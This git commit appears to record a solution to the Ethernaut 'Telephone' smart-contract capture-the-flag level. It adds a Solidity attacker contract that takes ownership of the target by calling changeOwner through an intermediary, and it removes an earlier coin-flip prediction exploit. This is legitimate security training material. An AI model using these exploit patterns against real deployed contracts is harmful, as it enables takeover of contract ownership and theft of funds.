8e682b0ec575c27de689028836c2829f734f07c6
Tanner Ang <ang713943@gmail.com>
2024-01-17 20:59:39 +0800

    complete 04-Telephone

--- script/solutions/04-Telephone.s.sol
+++ script/solutions/04-Telephone.s.sol
@@ -5,6 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+import {TelephoneAttacker} from "../../src/04-TelephoneAttacker.sol";
 
 contract TelephoneSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
@@ -16,7 +17,8 @@ contract TelephoneSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
+        TelephoneAttacker telephoneAttacker = new TelephoneAttacker(challengeInstance);
+        telephoneAttacker.attack();
 
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
--- src/04-TelephoneAttacker.sol
+++ src/04-TelephoneAttacker.sol
@@ -1,26 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface CoinFlip {
-    function flip(bool) external returns (bool);
+interface Telephone {
+    function changeOwner(address _owner) external;
 }
 
-// NOTE our goal is to guess the coin flip correctly 10 times in a row
-contract CoinFlipAttacker {
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    address challengeInstance;
-    CoinFlip victim; 
-    
-    constructor(address victimAddress) {
-        challengeInstance = victimAddress;
-        victim = CoinFlip(victimAddress);
+contract TelephoneAttacker {
+
+    address public challengeInstance;
+
+    constructor(address _challengeInstance) {
+        challengeInstance = _challengeInstance;
     }
 
-    function attack() public {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        bool success = victim.flip(side);
-        require(success, "flip failed");
+    function attack() external {
+        Telephone(challengeInstance).changeOwner(msg.sender);
     }
 }
